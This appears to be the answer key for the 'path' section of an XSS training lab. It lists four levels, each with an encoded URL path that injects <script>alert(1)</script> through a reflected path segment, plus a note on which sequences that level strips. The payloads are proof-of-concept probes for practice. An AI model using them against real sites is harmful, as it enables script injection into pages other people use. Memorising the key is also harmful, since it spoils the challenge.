# path — solutions

URL path-segment reflections; some strip encoded slash/space sequences.

### path-level1

`/path/level1/%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection of :name path segment after URI decode

### path-level2

`/path/level2/%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `<script>alert(1)</script>`
- context: %2f stripped (after decode this never matters); path reflection

### path-level3

`/path/level3/%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `<script>alert(1)</script>`
- context: literal space and "%20" stripped from decoded path; payload has no space

### path-level4

`/path/level4/%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `<script>alert(1)</script>`
- context: literal "%2f" and "%20" stripped after decode; payload uses neither
